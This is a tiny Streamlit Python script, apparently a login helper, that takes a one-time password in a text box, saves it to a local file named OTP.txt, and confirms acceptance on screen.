import streamlit as st

st.title("Signin Rescue!")
OTP = st.text_input("Enter OTP here", "")
if st.button("OK"):
    f=open("OTP.txt","w")
    f.write(OTP)
    f.close()
    st.markdown("### OTP accepted successfully!")